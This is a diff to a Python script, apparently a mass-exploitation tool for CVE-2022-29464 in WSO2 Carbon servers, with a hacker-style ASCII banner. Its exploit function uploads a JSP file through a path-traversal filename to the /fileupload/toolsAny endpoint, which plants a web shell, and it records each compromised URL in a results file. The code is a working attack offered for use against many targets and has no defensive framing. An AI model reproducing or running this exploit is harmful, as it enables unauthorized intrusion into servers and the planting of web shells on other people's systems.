@@ -24,13 +24,13 @@ def banners():
     stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║ ██╔══██║\n")
     stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║ ██╔══██║\n")
     stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║ ██║  ██║\n")
-    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═╝  ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
+    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═╝  ╚═╝\n")
     stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
     stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
     stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   Inyong 4xue             "+Fore.YELLOW+"║\n")
     stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/Inyong4zue  "+Fore.YELLOW+"║\n")
     stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
-    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONS                "+Fore.YELLOW+"║\n")
+    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONA                "+Fore.YELLOW+"║\n")
     stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"                          "+Fore.YELLOW+"║\n")
     stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
     print(f"{Fore.YELLOW}[CVE-2022-29464] - {Fore.GREEN}PERFORM WITH MASS EXPLOITS WSO2 CARBON SERVER\n")
@@ -39,14 +39,14 @@ banners()
 def exploit(url):
     try:
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Content-Type': 'application/json'} # .MF, .jspx, .jspf, .jsw, .jsv, xml, .war, .jsp, .aspx
-        files = {"../../../../repository/deployment/server/webapps/authenticationendpoint/axue.php": open("Files/axue.php", "rb")}
+        files = {"../../../../repository/deployment/server/webapps/authenticationendpoint/axue.jsp": open("Files/axue.jsp", "rb")}
 
         resp = requests.post(f"{url}/fileupload/toolsAny", timeout=10, verify=False, files=files)
 
         if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
-            print(f"{Fore.YELLOW}[CVE-2022-29464]{Fore.RED} .: {Fore.GREEN}[W00T!] {Fore.YELLOW}- {Fore.GREEN}{url}/authenticationendpoint/shell.jsp")
+            print(f"{Fore.YELLOW}[CVE-2022-29464]{Fore.RED} .: {Fore.GREEN}[4XUE!] {Fore.YELLOW}- {Fore.GREEN}{url}/authenticationendpoint/axue.jsp")
             with open('Results/Results.txt', 'a') as f:
-                f.write(f"{url}/authenticationendpoint/axue.php\n")
+                f.write(f"{url}/authenticationendpoint/axue.jsp\n")
         else:
             print(f"{Fore.YELLOW}[CVE-2022-29464]{Fore.YELLOW} .: {Fore.RED}[Failed!] {Fore.YELLOW}- {Fore.RED}{url}")
     except KeyboardInterrupt:
